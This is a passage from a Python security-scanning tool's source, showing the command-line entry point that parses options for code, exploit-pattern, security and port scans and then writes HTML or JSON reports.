    crit = scanner.stats["severity_counts"].get(SEVERITY_CRITICAL, 0)
    sys.exit(2 if crit > 0 else 0)


def main():
    _v_rt()
    if len(sys.argv) == 1 or sys.argv[1] == "--interactive":
        run_interactive()
        return

    parser = argparse.ArgumentParser(
        description="Alpha Universal Scanner™ — Unified Code, Network, Security & Exploit Analyzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:

  Interactive menu (just double-click or run with no args):
    python alpha_scanner.py

  Full scan (code + exploits + network + security + deep):
    python alpha_scanner.py /path/to/codebase --all

  Scan a ZIP file (auto-extracts):
    python alpha_scanner.py /path/to/code.zip --all

  Scan specific language:
    python alpha_scanner.py /path/to/monero --lang cpp --deep --exploits

  Exploit scan only:
    python alpha_scanner.py /path/to/code --exploits

  Network-only scan:
    python alpha_scanner.py --network-only --target-ip 192.168.1.1

  Security audit only:
    python alpha_scanner.py --security-only /path/to/project

  Custom output:
    python alpha_scanner.py /path/to/code -o report.html
    python alpha_scanner.py /path/to/code -o findings.json

  Scan with custom port range:
    python alpha_scanner.py /path/to/code --network --ports 1-65535

SUPPORTED LANGUAGES (35+):
  C/C++, Python, JavaScript, TypeScript, Java, C#, PHP, Ruby,
  Rust, Go, Solidity, Swift, Kotlin, Scala, Perl, Lua, R,
  Shell/Bash, PowerShell, HTML, CSS/SCSS/SASS/LESS, SQL,
  YAML, XML, JSON, TOML, Dockerfile, Makefile, CMake,
  Assembly, Objective-C, Dart, Elixir, Haskell, Zig, Nim, V

ACCEPTS: Folders, .zip files, .tar.gz files, .tar.bz2 files,
         individual files, or any path you can point to.

© 2024-2026 Alpha Unlimited Technologies LLC. All Rights Reserved.
        """
    )
    parser.add_argument("target", nargs="?", help="Path to folder, zip, tar.gz, or file to scan")
    parser.add_argument("--lang", choices=sorted(LANG_EXTENSIONS.keys()), help="Filter to specific language")
    parser.add_argument("--deep", action="store_true", help="Enable deep analysis (duplicates, long functions, etc.)")
    parser.add_argument("--exploits", action="store_true", help="Enable exploit detection (attack vectors, exploit chains)")
    parser.add_argument("--network", action="store_true", help="Enable network port scanning")
    parser.add_argument("--network-only", action="store_true", help="Run only network scan (no code scan)")
    parser.add_argument("--security", action="store_true", help="Enable security audit")
    parser.add_argument("--security-only", action="store_true", help="Run only security audit (no code scan)")
    parser.add_argument("--fsmap", action="store_true", help="Enable deep file system mapping")
    parser.add_argument("--depweb", action="store_true", help="Enable dependency graph spider")
    parser.add_argument("--deadcode", action="store_true", help="Enable dead code & unreachable path detection")
    parser.add_argument("--config-audit", action="store_true", help="Enable configuration & secret audit")
    parser.add_argument("--quality", action="store_true", help="Enable code quality analysis")
    parser.add_argument("--all", action="store_true", help="Enable ALL scans (every module)")
    parser.add_argument("--target-ip", dest="target_ip", default="127.0.0.1", help="Network scan target IP (default: 127.0.0.1)")
    parser.add_argument("--ports", help="Port range to scan (e.g., '1-1024' or '80,443,8080')")
    parser.add_argument("--output", "-o", help="Output file path (.html or .json)")
    parser.add_argument("--interactive", action="store_true", help="Launch interactive menu")
    parser.add_argument("--version", action="version", version=f"Alpha Universal Scanner™ v{VERSION}")

    args = parser.parse_args()

    if args.interactive:
        run_interactive()
        return

    if not args.target and not args.network_only:
        parser.print_help()
        print("\nError: Provide a target path, use --network-only, or run with no args for interactive mode.")
        sys.exit(1)

    target_path = args.target
    if target_path:
        tp = Path(target_path)
        if tp.is_file() and tp.suffix.lower() in (".zip", ".tar", ".gz", ".tgz", ".bz2", ".xz", ".7z", ".rar") or (tp.is_file() and ".tar" in tp.name.lower()):
            target_path = extract_archive(tp)
            if not target_path:
                sys.exit(1)
        elif tp.is_file():
            parent_dir = tempfile.mkdtemp(prefix="alpha_scan_single_")
            shutil.copy2(str(tp), parent_dir)
            target_path = parent_dir

    port_range = None
    if args.ports:
        port_range = []
        for part in args.ports.split(","):
            if "-" in part:
                start, end = part.split("-")
                port_range.extend(range(int(start), int(end) + 1))
            else:
                port_range.append(int(part))

    if not target_path and (args.security_only):
        target_path = "."

    do_deep = args.deep or args.all
    do_exploit = args.exploits or args.all
    do_network = args.network or args.network_only or args.all
    do_security = args.security or args.security_only or args.all
    do_fsmap = args.fsmap or args.all
    do_depweb = args.depweb or args.all
    do_deadcode = args.deadcode or args.all
    do_config = args.config_audit or args.all
    do_quality = args.quality or args.all

    scanner = AlphaUniversalScanner(
        target_path=target_path,
        lang_filter=args.lang,
        deep_scan=do_deep,
        network_scan=do_network,
        network_target=args.target_ip,
        security_scan=do_security,
        exploit_scan=do_exploit,
        port_range=port_range,
        fsmap_scan=do_fsmap,
        depweb_scan=do_depweb,
        deadcode_scan=do_deadcode,
        config_audit=do_config,
        quality_scan=do_quality,
    )
    scanner.scan()

    if args.output:
        out = Path(args.output)
        if out.suffix == ".json":
            scanner.export_json(str(out))
        else:
            scanner.export_html(str(out))
    else:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        scanner.export_html(f"alpha_scan_report_{ts}.html")
        scanner.export_json(f"alpha_scan_report_{ts}.json")

    crit = scanner.stats["severity_counts"].get(SEVERITY_CRITICAL, 0)
    sys.exit(2 if crit > 0 else 0)


if __name__ == "__main__":
    main()
